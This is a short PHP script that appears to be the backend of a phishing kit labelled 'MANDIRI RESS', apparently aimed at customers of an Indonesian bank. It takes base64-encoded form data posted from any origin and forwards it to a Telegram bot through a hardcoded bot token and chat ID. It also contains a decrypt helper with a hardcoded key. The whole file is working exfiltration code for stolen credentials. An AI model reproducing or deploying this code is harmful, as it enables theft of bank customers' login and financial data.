<?php

header("Access-Control-Allow-Origin: *");

$message = base64_decode($_POST['message']);
$token = '7165069422:AAHcLAkhH7WuFlEd1Q0BLCurbRXpd0rK6r0';
$chatID = '6562479119';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"https://api.telegram.org/bot".$token."/sendMessage?parse_mode=html");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"chat_id":"'.$chatID.'","text":"━─━─༺MANDIRI RESS༻─━─━\n\n(MANDIRI RESSULTKU)\n\n'.
    $message.'"}');
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$server_output = curl_exec($ch);
curl_close($ch);

function decrypt($value) {
    $key = 'Qu0qMbE4EtduQF8';
    $decrypted = openssl_decrypt($value, "aes-256-cbc", $key);
    return $decrypted;
}
